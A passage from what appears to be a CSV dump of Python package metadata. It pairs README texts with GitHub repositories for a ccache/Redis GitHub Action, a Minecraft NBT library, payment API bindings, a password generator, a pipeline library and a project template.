          - 6379/tcp
          # get the rendom port via ${{ job.services.redis.ports['6379'] }}
          # https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idservices
          # https://docs.github.com/en/actions/learn-github-actions/contexts#job-context
          # Maps port 6379 on service container to the host
          #- 6379:6379

    steps:
      - name: ""Set some redis settings""
        run: |
          docker network ls
          docker network ls --format='{{.ID }} {{.Name}}'
          docker inspect ${{ job.services.redis.id }}
          docker exec ${{ job.services.redis.id }} /bin/sh -c 'echo ""cat /etc/redis/redis.conf ||:"" '
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'mkdir -p /etc/redis ||: '
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""save 60 100"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""loglevel verbose"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""# see https://github.community/t/how-do-i-properly-override-a-service-entrypoint/17435/8"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""# https://hub.docker.com/_/redis"" >> /etc/redis/redis.conf'
          docker kill --signal=SIGHUP ${{ job.services.redis-y9g98g58d.id }} ||:

      - name: Checkout repository
        uses: actions/checkout@v3

      - upload-test: ""upload-test""
        run: |
          ccache-upload-redis
        env: |
          REDIS_CONF='localhost:${{ job.services.redis.ports['6379'] }}'
          CCACHE_DIR='~/.cache/ccache'
          
      - download-test: ""download-test""
        run: |
          ccache-download-redis
        env: |
          REDIS_CONF='localhost:${{ job.services.redis.ports['6379'] }}'
          CCACHE_DIR='~/.cache/ccache'

      - name: Connect REDIS
        uses: ./
        with:
          host: ${{ variable.REDIS_SERVER }}
          username: ${{ variable.USERNAME }}
          password: ${{ variable.PASSWORD }}
          ccachedir: ${{ variable.CCACHEDIR }}

","# ccache-upload-redis / ccache-download-redis GitHub Action

An GitHub Action for using ccache-upload-redis / ccache-download-redis
to uploads / downloads the contents of the local ccache cache from a Redis remote storage.

## Usage

- 
- 


```yaml
name: Test ccache-download-upload-redis
on:
  workflow_dispatch:
jobs:
  # Label of the container job
  container-job:
    # Containers must run in Linux based operating systems
    runs-on: ubuntu-latest
    # Service containers to run with `container-job`
    services:
      # Label used to access the service container
      redis:
        # Docker Hub image
        image: redis:7.0.10-alpine3.17
        # Set health checks to wait until redis has started
        options: >-
          --interactive
          --hostname redis
          --add-host=host.docker.internal:host-gateway
          --health-cmd ""redis-cli ping""
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
          --restart always
        ports:
          - 6379/tcp
          # get the rendom port via ${{ job.services.redis.ports['6379'] }}
          # https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idservices
          # https://docs.github.com/en/actions/learn-github-actions/contexts#job-context
          # Maps port 6379 on service container to the host
          #- 6379:6379

    steps:
      - name: ""Set some redis settings""
        run: |
          docker network ls
          docker network ls --format='{{.ID }} {{.Name}}'
          docker inspect ${{ job.services.redis.id }}
          docker exec ${{ job.services.redis.id }} /bin/sh -c 'echo ""cat /etc/redis/redis.conf ||:"" '
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'mkdir -p /etc/redis ||: '
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""save 60 100"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""loglevel verbose"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""# see https://github.community/t/how-do-i-properly-override-a-service-entrypoint/17435/8"" >> /etc/redis/redis.conf'
          docker exec ${{ job.services.redis.id }} /bin/sh -x -c 'echo ""# https://hub.docker.com/_/redis"" >> /etc/redis/redis.conf'
          docker kill --signal=SIGHUP ${{ job.services.redis-y9g98g58d.id }} ||:

      - name: Checkout repository
        uses: actions/checkout@v3

      - upload-test: ""upload-test""
        run: |
          ccache-upload-redis
        env: |
          REDIS_CONF='localhost:${{ job.services.redis.ports['6379'] }}'
          CCACHE_DIR='~/.cache/ccache'
          
      - download-test: ""download-test""
        run: |
          ccache-download-redis
        env: |
          REDIS_CONF='localhost:${{ job.services.redis.ports['6379'] }}'
          CCACHE_DIR='~/.cache/ccache'

      - name: Connect REDIS
        uses: ./
        with:
          host: ${{ variable.REDIS_SERVER }}
          username: ${{ variable.USERNAME }}
          password: ${{ variable.PASSWORD }}
          ccachedir: ${{ variable.CCACHEDIR }}

",berlin4apk/action-ccache-download-upload-redis
revs,https://github.com/fenixinvitado2021/revistas,2,0,0,,,fenixinvitado2021/revistas
nbt-structure-utils,https://github.com/BenBenBenB/nbt-structure-utils,2,2263,2263,"# NBT Structure Utils

> A python library to create and edit NBT structure files for Minecraft.

This has been tested with Minecraft Java, version 1.19.3.

**Features**

- Create, read, and edit NBT structure files.
- Methods inspired by Minecraft's fill, setblock, and clone commands.
- Edit the state, inventory, and NBT data of blocks.
- Special classes to help fill Cuboids and draw straight lines.

## Basic Usage
See class docstrings for finer details and lists of methods.

### Minecraft NBT Structure
This library creates .nbt files that can be placed in minecraft worlds. with a Structure Block or structure command. 

See the minecraft wiki for details on each:
- [Structure Block](https://minecraft.fandom.com/wiki/Structure_Block)
- [structure Command](https://minecraft.fandom.com/wiki/Commands/structure)


### Edit blocks
Basic Example: create a 5x5x5 cube of stone and save to file:
```python
from nbt_structure_utils import NBTStructure, Vector, Cuboid, BlockData
nbtstructure = NBTStructure()
c1, c2 = Vector(0, 0, 0), Vector(4, 4, 4)
nbtstructure.fill(Cuboid(c1, c2), BlockData(""stone""))
nbtstructure.get_nbt().write_file(filename=""path/to/output/hollow_box.nbt"")
```

### Read and Edit 
You can load and edit NBT structures created by this library or by Minecraft. All or part of a structure can also be cloned into other structures.

Example: Load from disk and mirror the structure to be upside down:
```python
from nbt_structure_utils import NBTStructure, Vector
nbtstructure = NBTStructure(""path/to/existing_structure.nbt"")
nbtstructure.reflect(Vector(None,0,None))
nbtstructure.get_nbt().write_file(filename=""path/to/output/structure_flipped.nbt"")
```

### Edit inventories
Create an Inventory and save it to desired blocks.

Example: Create a dropper with an enchanted wooden sword in the 5th slot:
```python
from nbt_structure_utils import NBTStructure, Vector, BlockData, Inventory, Enchantment
structure = NBTStructure()
inv_block_info = BlockData(""dropper"",[(""facing"",""up"")])
enchants = [Enchantment(""sweeping"", 3)]
inv = Inventory([ItemStack(""wooden_sword"", 1, 4, 0, enchants, None)])
structure.set_block(Vector(0, 0, 0), inv_block_info, inv, None)
nbtstructure.get_nbt().write_file(filename=""path/to/output/sword_dropper.nbt"")
```
","# NBT Structure Utils

> A python library to create and edit NBT structure files for Minecraft.

This has been tested with Minecraft Java, version 1.19.3.

**Features**

- Create, read, and edit NBT structure files.
- Methods inspired by Minecraft's fill, setblock, and clone commands.
- Edit the state, inventory, and NBT data of blocks.
- Special classes to help fill Cuboids and draw straight lines.

## Basic Usage
See class docstrings for finer details and lists of methods.

### Minecraft NBT Structure
This library creates .nbt files that can be placed in minecraft worlds. with a Structure Block or structure command. 

See the minecraft wiki for details on each:
- [Structure Block](https://minecraft.fandom.com/wiki/Structure_Block)
- [structure Command](https://minecraft.fandom.com/wiki/Commands/structure)


### Edit blocks
Basic Example: create a 5x5x5 cube of stone and save to file:
```python
from nbt_structure_utils import NBTStructure, Vector, Cuboid, BlockData
nbtstructure = NBTStructure()
c1, c2 = Vector(0, 0, 0), Vector(4, 4, 4)
nbtstructure.fill(Cuboid(c1, c2), BlockData(""stone""))
nbtstructure.get_nbt().write_file(filename=""path/to/output/hollow_box.nbt"")
```

### Read and Edit 
You can load and edit NBT structures created by this library or by Minecraft. All or part of a structure can also be cloned into other structures.

Example: Load from disk and mirror the structure to be upside down:
```python
from nbt_structure_utils import NBTStructure, Vector
nbtstructure = NBTStructure(""path/to/existing_structure.nbt"")
nbtstructure.reflect(Vector(None,0,None))
nbtstructure.get_nbt().write_file(filename=""path/to/output/structure_flipped.nbt"")
```

### Edit inventories
Create an Inventory and save it to desired blocks.

Example: Create a dropper with an enchanted wooden sword in the 5th slot:
```python
from nbt_structure_utils import NBTStructure, Vector, BlockData, Inventory, Enchantment
structure = NBTStructure()
inv_block_info = BlockData(""dropper"",[(""facing"",""up"")])
enchants = [Enchantment(""sweeping"", 3)]
inv = Inventory([ItemStack(""wooden_sword"", 1, 4, 0, enchants, None)])
structure.set_block(Vector(0, 0, 0), inv_block_info, inv, None)
nbtstructure.get_nbt().write_file(filename=""path/to/output/sword_dropper.nbt"")
```
",benbenbenb/nbt-structure-utils
paayes,https://github.com/paayes/paayes-python,2,934,934,"Official Paayes Bindings for Python
===================================

A Python library for Paayes's API.


Setup
-----

You can install this package by using the pip tool and installing:

    $ pip install paayes

Or:

    $ easy_install paayes


Setting up a Paayes Account
---------------------------

Sign up for Paayes at https://dashboard.paayes.com/register.

Using the Paayes API
--------------------

Documentation for the python bindings can be found alongside Paayes's other bindings here:

- https://docs.paayes.com/docs/
- https://docs.paayes.com/api/python

In the standard documentation (the first link), most of the reference pages will have examples in Paayes's official bindings (including Python). Just click on the Python tab to get the relevant documentation.

In the full API reference for python (the second link), the right half of the page will provide example requests and responses for various API calls.
","Official Paayes Bindings for Python
===================================

A Python library for Paayes's API.


Setup
-----

You can install this package by using the pip tool and installing:

    $ pip install paayes

Or:

    $ easy_install paayes


Setting up a Paayes Account
---------------------------

Sign up for Paayes at https://dashboard.paayes.com/register.

Using the Paayes API
--------------------

Documentation for the python bindings can be found alongside Paayes's other bindings here:

- https://docs.paayes.com/docs/
- https://docs.paayes.com/api/python

In the standard documentation (the first link), most of the reference pages will have examples in Paayes's official bindings (including Python). Just click on the Python tab to get the relevant documentation.

In the full API reference for python (the second link), the right half of the page will provide example requests and responses for various API calls.
",paayes/paayes-python
securepasswordgenerator,https://github.com/quillfires/SecurePasswordGenerator,0,5526,5499,"# SecurePasswordGenerator
`SecurePasswordGenerator` is a tool for generating random secure passwords. It provides both command line utility (CLI) and underlying python module.

## Table of Contents
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
    - [Command Line Utility](#command-line-utility)
- [License](#license)

## Prerequisites
You'll need to have Python installed in order to run `SecurePasswordGenerator`. Start by downloading and installing [Python](https://www.python.org/downloads/).
> *Note: Python 3 is recommended, however `SecurePasswordGenerator` has been successfully tested with Python 2.6+*


## Installation
```
python -m pip install securepasswordgenerator
```

## Usage
`SecurePasswordGenerator` provides the following methods:
```py
securepasswordgenerator.generate(length = 10, use_lower_case = True, use_upper_case = True, use_numbers = True, use_special = False, use_hex = False)
securepasswordgenerator.decent() 
securepasswordgenerator.strong() 
securepasswordgenerator.fort_knox() 
securepasswordgenerator.ci_key() 
securepasswordgenerator.wep_64() 
securepasswordgenerator.wep_128() 
securepasswordgenerator.wep_152() 
securepasswordgenerator.wep_256() 
securepasswordgenerator.wpa_160() 
securepasswordgenerator.wpa_504()
```

Sample code:
```py
>>> import securepasswordgenerator
>>> securepasswordgenerator.generate()
'ZgnoiVCQ'
>>> securepasswordgenerator.generate(15, use_lower_case=False, use_numbers=False, use_special=True)
'<)G,{IH~NDGZ+D@'
>>> securepasswordgenerator.decent() 
'CONt8xy4Vw'
>>> securepasswordgenerator.strong() 
'm?c$t?WP<y|}vVf'
>>> securepasswordgenerator.fort_knox() 
""'>[&;6L8?->vXiKWh>Uoe<Uo-.x,Zb""
>>> securepasswordgenerator.ci_key() 
'I9MMEnszZO4mKGJayBXe9kKsEGg7JXBs'
>>> securepasswordgenerator.wep_64() 
'866EE'
>>> securepasswordgenerator.wep_128() 
'9EBD3954549FC'
>>> securepasswordgenerator.wep_152() 
'D5CB8A9668F2153D'
>>> securepasswordgenerator.wep_256() 
'E775C1FA7D96CF94DFB19CB9ED534'
>>> securepasswordgenerator.wpa_160() 
'1XkW\\eHu5,ox9I&K`I<R'
>>> securepasswordgenerator.wpa_504()
""AkW~Z9/)d2rf`JWPU}CcUq*`BTsq8%'i+,~BAp2nf@*t!W&~rlpxq(Grh6>$1rj""
```

### Command Line Utility
`SecurePasswordGenerator` includes a command line utility for generating passwords.
```
securepasswordgenerator --help
usage: securepasswordgenerator.py [-h] [-l] [-L] [-u] [-U] [-n] [-N] [-s] [-S] [-x] [-X] [-DP] [-SP] [-FP] [-ci] [-wpa160] [-wpa504]
                         [-wep64] [-wep128] [-wep152] [-wep256]
                         [length]

The Secure Password or Keygen Generator

positional arguments:
  length                Length of password (default is 8 characters)

options:
  -h, --help            show this help message and exit
  -l, --lower-enable    Use lowercase characters
  -L, --lower-disable   Don't use lowercase characters
  -u, --upper-enable    use upper case characters
  -U, --upper-disable   don't use upper case characters
  -n, --number-enable   use number characters
  -N, --number-disable  don't use number characters
  -s, --special-enable  use special characters
  -S, --special-disable
                        don't use special characters
  -x, --hex-enable      use hex characters
  -X, --hex-disable     don't use hex characters
  -DP, --decent         Generate Memorable Passwords - Perfect for securing your computer or mobile device, or somewhere brute
                        force is detectable.
  -SP, --strong         Generate Strong Passwords - Robust enough to keep your web hosting account secure.
  -FP, --fort_knox      Generate Fort Knox Passwords - Secure enough for almost anything, like root or administrator passwords.
  -ci, --ci_key         Generate CodeIgniter Encryption Keys - Can be used for any other 256-bit key requirement.
  -wpa160, --wpa_160    Generate 160-bit WPA Key
  -wpa504, --wpa_504    Generate 504-bit WPA Key
  -wep64, --wep_64      Generate 64-bit WEP Keys
  -wep128, --wep_128    Generate 128-bit WEP Keys
  -wep152, --wep_152    Generate 152-bit WEP Keys
  -wep256, --wep_256    Generate 256-bit WEP Keys
```
> *Note: `-DP`, `--decent`, `-SP`, `--strong`, `-FP`, `--fort_knox`, `-ci`, `--ci_key`, `-wpa160`, `--wpa_160`, `-wpa504`, `--wpa_504`, `-wep64`, `--wep_64`, `-wep128`, `--wep_128`, `-wep152`, `--wep_152`, `-wep256`, `--wep_256` doesn't require any other arguments*


## License

This project is licensed under the MIT License
```
MIT License

Copyright (c) 2023-present Ali Fayaz (Quill) (quillfires)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
","# SecurePasswordGenerator
`SecurePasswordGenerator` is a tool for generating random secure passwords. It provides both command line utility (CLI) and underlying python module.

## Table of Contents
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
    - [Command Line Utility](#command-line-utility)
- [License](#license)

## Prerequisites
You'll need to have Python installed in order to run `SecurePasswordGenerator`. Start by downloading and installing [Python](https://www.python.org/downloads/).
> *Note: Python 3 is recommended, however `SecurePasswordGenerator` has been successfully tested with Python 2.6+*


## Installation
```
python -m pip install securepasswordgenerator
```

## Usage
`SecurePasswordGenerator` provides the following methods:
```py
securepasswordgenerator.generate(length = 10, use_lower_case = True, use_upper_case = True, use_numbers = True, use_special = False, use_hex = False)
securepasswordgenerator.decent() 
securepasswordgenerator.strong() 
securepasswordgenerator.fort_knox() 
securepasswordgenerator.ci_key() 
securepasswordgenerator.wep_64() 
securepasswordgenerator.wep_128() 
securepasswordgenerator.wep_152() 
securepasswordgenerator.wep_256() 
securepasswordgenerator.wpa_160() 
securepasswordgenerator.wpa_504()
```

Sample code:
```py
>>> import securepasswordgenerator
>>> securepasswordgenerator.generate()
'ZgnoiVCQ'
>>> securepasswordgenerator.generate(15, use_lower_case=False, use_numbers=False, use_special=True)
'<)G,{IH~NDGZ+D@'
>>> securepasswordgenerator.decent() 
'CONt8xy4Vw'
>>> securepasswordgenerator.strong() 
'm?c$t?WP>> securepasswordgenerator.fort_knox() 
""'>[&;6L8?->vXiKWh>Uoe>> securepasswordgenerator.ci_key() 
'I9MMEnszZO4mKGJayBXe9kKsEGg7JXBs'
>>> securepasswordgenerator.wep_64() 
'866EE'
>>> securepasswordgenerator.wep_128() 
'9EBD3954549FC'
>>> securepasswordgenerator.wep_152() 
'D5CB8A9668F2153D'
>>> securepasswordgenerator.wep_256() 
'E775C1FA7D96CF94DFB19CB9ED534'
>>> securepasswordgenerator.wpa_160() 
'1XkW\\eHu5,ox9I&K`I>> securepasswordgenerator.wpa_504()
""AkW~Z9/)d2rf`JWPU}CcUq*`BTsq8%'i+,~BAp2nf@*t!W&~rlpxq(Grh6>$1rj""
```

### Command Line Utility
`SecurePasswordGenerator` includes a command line utility for generating passwords.
```
securepasswordgenerator --help
usage: securepasswordgenerator.py [-h] [-l] [-L] [-u] [-U] [-n] [-N] [-s] [-S] [-x] [-X] [-DP] [-SP] [-FP] [-ci] [-wpa160] [-wpa504]
                         [-wep64] [-wep128] [-wep152] [-wep256]
                         [length]

The Secure Password or Keygen Generator

positional arguments:
  length                Length of password (default is 8 characters)

options:
  -h, --help            show this help message and exit
  -l, --lower-enable    Use lowercase characters
  -L, --lower-disable   Don't use lowercase characters
  -u, --upper-enable    use upper case characters
  -U, --upper-disable   don't use upper case characters
  -n, --number-enable   use number characters
  -N, --number-disable  don't use number characters
  -s, --special-enable  use special characters
  -S, --special-disable
                        don't use special characters
  -x, --hex-enable      use hex characters
  -X, --hex-disable     don't use hex characters
  -DP, --decent         Generate Memorable Passwords - Perfect for securing your computer or mobile device, or somewhere brute
                        force is detectable.
  -SP, --strong         Generate Strong Passwords - Robust enough to keep your web hosting account secure.
  -FP, --fort_knox      Generate Fort Knox Passwords - Secure enough for almost anything, like root or administrator passwords.
  -ci, --ci_key         Generate CodeIgniter Encryption Keys - Can be used for any other 256-bit key requirement.
  -wpa160, --wpa_160    Generate 160-bit WPA Key
  -wpa504, --wpa_504    Generate 504-bit WPA Key
  -wep64, --wep_64      Generate 64-bit WEP Keys
  -wep128, --wep_128    Generate 128-bit WEP Keys
  -wep152, --wep_152    Generate 152-bit WEP Keys
  -wep256, --wep_256    Generate 256-bit WEP Keys
```
> *Note: `-DP`, `--decent`, `-SP`, `--strong`, `-FP`, `--fort_knox`, `-ci`, `--ci_key`, `-wpa160`, `--wpa_160`, `-wpa504`, `--wpa_504`, `-wep64`, `--wep_64`, `-wep128`, `--wep_128`, `-wep152`, `--wep_152`, `-wep256`, `--wep_256` doesn't require any other arguments*


## License

This project is licensed under the MIT License
```
MIT License

Copyright (c) 2023-present Ali Fayaz (Quill) (quillfires)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```
",quillfires/securepasswordgenerator
gwsnr,https://github.com/hemantaph/gwsnr,0,0,0,,,hemantaph/gwsnr
kaggle-util,https://github.com/neural-navigator/kaggle_utility,1,0,0,,,neural-navigator/kaggle_utility
dpipes,https://github.com/chris-santiago/dpipes,4,3690,3690,"# dPipes - Pythonic Data Pipelines

## About

`dPipes` is a Python package for creating **reusable, modular, and composable** data pipelines. 
It's small project that came out of the desire to turn this:

```py
import pandas as pd

data = (data.pipe(func_1)
        .pipe(func_2)
        .pipe(func_3)
)
```

into this:

```py
from dpipes.processor import PipeProcessor

ps = PipeProcessor(
    funcs=[func_1, func_2, func_3]
)

data = ps(data)
```

Now, arguably, there is not much functional difference between the two implementations. They both
accomplish the same task with roughly the same amount of code. 

**But, what happens if you want to apply the same pipeline of functions to a different data
object?**

Using the first method, you'd need to re-write (copy/paste) your method-chaining pipeline:

```py
new_data = (new_data.pipe(func_1)
        .pipe(func_2)
        .pipe(func_3)
)
```

Using the latter method, **you'd only need to pass in a different object** to the pipeline:

```py
new_data = ps(new_data)
```

## Under the Hood

`dPipes` uses two functions from Python's `functools` module: `reduce` and `partial`. The `reduce`
function enables function composition; the `partial` function enables use of arbitrary `kwargs`.

## Generalization

Although `dPipes` initially addressed `pd.DataFrame.pipe` method-chaining, it's extensible to any
API that implements a pandas-like `DataFrame.pipe` method (e.g. Polars). Further, the 
`dpipes.pipeline` extends this composition to any arbitrary Python function.  

That is, this:

```py
result = func_3(func_2(func_1(x)))
```

or this:

```py
result = func_1(x)
result = func_2(result)
result = func_3(result)
```

becomes this:

```py
from dpipes.pipeline import Pipeline

pl = Pipeline(funcs=[func_1, func_2, func_3])
result = pl(x)
```

which is, arguably, more readable and, once again, easier to apply to other objects.

## Installation

`dPipes` is can be installed via `pip`:

```zsh
pip install dpipes
```

We recommend setting up a virtual environment with Python >= 3.8.  

## Benefits

### Reusable Pipelines

As you'll see in the [tutorials](https://chris-santiago.github.io/dpipes/tutorial-pandas/), 
one of the key benefits of using `dPipes` is the reusable pipeline object that can be called on 
multiple datasets (provided their schemas are similar):

```python title=""Using PipeProcessor""
for ds in [split_1, split_2, split_3]:
    result_b = ps(ds)

pd.testing.assert_frame_equal(result_a, result_b)
```

### Modular Pipelines

Another is the ability to create modularized pipelines that can easily be imported and used 
elsewhere in code:

```python title=""my_module.py""
""""""My pipeline module.""""""

from dpipes.processor import PipeProcessor


def task_1(...):
    ...


def task_2(...):
    ...


def task_3(...):
    ...


def task_4(...):
    ...


my_pipeline = PipeProcessor([task_1, task_2, task_3, task_4])
```

```python title=""main.py""
from my_module import my_pipeline

my_pipeline(my_data)
```

### Composable Pipelines

Finally, you can compose large, complex processing pipelines using an arbitrary number of sub-pipelines:

```python title=""PipeProcessor Composition""
ps = PipeProcessor([
    task_1,
    task_2,
    task_3,
    task_4,
])

col_ps_single = ColumnPipeProcessor(
    funcs=[task_5, task_6],
    cols=""customer_id""
)

col_ps_multi = ColumnPipeProcessor(
    funcs=[task_7, task_8],
    cols=[""customer_id"", ""invoice""]
)

col_ps_nested = ColumnPipeProcessor(
    funcs=[task_9, task_10],
    cols=[
        [""quantity"", ""price""],
        [""invoice""],
    ]
)

pipeline = PipeProcessor([
    ps,
    col_ps_single,
    col_ps_multi,
    col_ps_nested,
])

result = pipeline(data)
```
","# dPipes - Pythonic Data Pipelines

## About

`dPipes` is a Python package for creating **reusable, modular, and composable** data pipelines. 
It's small project that came out of the desire to turn this:

```py
import pandas as pd

data = (data.pipe(func_1)
        .pipe(func_2)
        .pipe(func_3)
)
```

into this:

```py
from dpipes.processor import PipeProcessor

ps = PipeProcessor(
    funcs=[func_1, func_2, func_3]
)

data = ps(data)
```

Now, arguably, there is not much functional difference between the two implementations. They both
accomplish the same task with roughly the same amount of code. 

**But, what happens if you want to apply the same pipeline of functions to a different data
object?**

Using the first method, you'd need to re-write (copy/paste) your method-chaining pipeline:

```py
new_data = (new_data.pipe(func_1)
        .pipe(func_2)
        .pipe(func_3)
)
```

Using the latter method, **you'd only need to pass in a different object** to the pipeline:

```py
new_data = ps(new_data)
```

## Under the Hood

`dPipes` uses two functions from Python's `functools` module: `reduce` and `partial`. The `reduce`
function enables function composition; the `partial` function enables use of arbitrary `kwargs`.

## Generalization

Although `dPipes` initially addressed `pd.DataFrame.pipe` method-chaining, it's extensible to any
API that implements a pandas-like `DataFrame.pipe` method (e.g. Polars). Further, the 
`dpipes.pipeline` extends this composition to any arbitrary Python function.  

That is, this:

```py
result = func_3(func_2(func_1(x)))
```

or this:

```py
result = func_1(x)
result = func_2(result)
result = func_3(result)
```

becomes this:

```py
from dpipes.pipeline import Pipeline

pl = Pipeline(funcs=[func_1, func_2, func_3])
result = pl(x)
```

which is, arguably, more readable and, once again, easier to apply to other objects.

## Installation

`dPipes` is can be installed via `pip`:

```zsh
pip install dpipes
```

We recommend setting up a virtual environment with Python >= 3.8.  

## Benefits

### Reusable Pipelines

As you'll see in the [tutorials](https://chris-santiago.github.io/dpipes/tutorial-pandas/), 
one of the key benefits of using `dPipes` is the reusable pipeline object that can be called on 
multiple datasets (provided their schemas are similar):

```python title=""Using PipeProcessor""
for ds in [split_1, split_2, split_3]:
    result_b = ps(ds)

pd.testing.assert_frame_equal(result_a, result_b)
```

### Modular Pipelines

Another is the ability to create modularized pipelines that can easily be imported and used 
elsewhere in code:

```python title=""my_module.py""
""""""My pipeline module.""""""

from dpipes.processor import PipeProcessor


def task_1(...):
    ...


def task_2(...):
    ...


def task_3(...):
    ...


def task_4(...):
    ...


my_pipeline = PipeProcessor([task_1, task_2, task_3, task_4])
```

```python title=""main.py""
from my_module import my_pipeline

my_pipeline(my_data)
```

### Composable Pipelines

Finally, you can compose large, complex processing pipelines using an arbitrary number of sub-pipelines:

```python title=""PipeProcessor Composition""
ps = PipeProcessor([
    task_1,
    task_2,
    task_3,
    task_4,
])

col_ps_single = ColumnPipeProcessor(
    funcs=[task_5, task_6],
    cols=""customer_id""
)

col_ps_multi = ColumnPipeProcessor(
    funcs=[task_7, task_8],
    cols=[""customer_id"", ""invoice""]
)

col_ps_nested = ColumnPipeProcessor(
    funcs=[task_9, task_10],
    cols=[
        [""quantity"", ""price""],
        [""invoice""],
    ]
)

pipeline = PipeProcessor([
    ps,
    col_ps_single,
    col_ps_multi,
    col_ps_nested,
])

result = pipeline(data)
```
",chris-santiago/dpipes
wikiseriesasorkunlib,https://github.com/alisorkuncuk/wikiseriesasorkunlib,0,2434,2434,"====================
wikiseriesasorkunlib
====================

This my project


* Documentation: https://wikiseriesasorkunlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* 
","====================
wikiseriesasorkunlib
====================

This my project


* Documentation: https://wikiseriesasorkunlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* 
",alisorkuncuk/wikiseriesasorkunlib
